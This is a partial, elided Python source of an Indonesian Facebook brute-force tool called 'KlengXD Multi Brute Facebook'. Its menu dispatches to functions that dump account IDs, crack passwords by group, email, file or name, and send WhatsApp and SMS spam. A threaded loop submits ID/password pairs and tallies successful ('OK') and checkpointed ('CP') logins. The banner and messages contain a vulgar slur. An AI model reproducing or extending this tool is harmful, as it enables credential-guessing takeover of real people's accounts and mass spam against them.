...
sys.stdout.write('\x1b]2; BMBF | KlengXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
...
def clear():
	os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():cetak(panel(f"""[bold pink]         KONTOL
             """,width=90,padding=(0,8),title=f"Ini",style=f"bold yellow"))
             #--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]",width=90,title=f"[bold green]Thanks To Allah",style=f"bold white"))
	...
	_____kleng___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____kleng___xd____ in ['1','01']:
		kleng_dump()
	elif _____kleng___xd____ in ['2','02']:
		dump_massal()
	elif _____kleng___xd____ in ['3','03']:
		crack_group()
	elif _____kleng___xd____ in ['4','04']:
		crack_email()
	elif _____kleng___xd____ in ['5','05']:
		crack_file()
	elif _____kleng___xd____ in ['6','06']:
		crack_nama()
	elif _____kleng___xd____ in ['7','07']:
		pengikut()
	elif _____kleng___xd____ in ['8','08']:
		komen()
	elif _____kleng___xd____ in ['9','09']:
		file_cp()
	elif _____kleng___xd____ in ['10']:
		result()
	elif _____kleng___xd____ in ['11']:
		siu()
	elif _____kleng___xd____ in ['12']:
		spam_wa()
	elif _____kleng___xd____ in ['13']:
		spam_sms()
	elif _____kleng___xd____ in ['14']:
		dumpid()
	elif _____kleng___xd____ in ['15']:
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'validate1' in method:
					...
					pool.submit(validate1,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Bersyukur KONTOL!!!')
	print(f'  [+] OK : {H}{ok} ')
	print(f'  [+] CP : {K}{cp} ')
